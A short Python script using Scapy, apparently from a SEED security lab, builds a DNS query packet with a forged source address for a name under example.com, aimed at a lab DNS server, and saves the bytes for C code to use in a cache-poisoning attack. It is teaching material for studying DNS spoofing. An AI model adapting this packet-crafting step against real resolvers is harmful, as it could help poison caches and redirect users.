#!/usr/bin/python3
from scapy.all import *

# based on SEED book code

targetName = 'twy.example.com'
local_DNS_ip = '10.9.0.53'
spoofed_ip = '1.2.3.4'

# from a random src to local DNS server
IPpkt  = IP(src='10.9.0.153',dst=local_DNS_ip)

# from a random sport to DNS dport
UDPpkt = UDP(sport=12345, dport=53,chksum=0)

# a inexistent fake FQDN in the target domain: example.com
# the C code will modify it
Qdsec    = DNSQR(qname=targetName) 
DNSpkt   = DNS(id=0xAAAA, qr=0, qdcount=1, qd=Qdsec)
Querypkt = IPpkt/UDPpkt/DNSpkt

# Save the packet data to a file
with open('ip_req.bin', 'wb') as f:
  f.write(bytes(Querypkt))
  Querypkt.show()
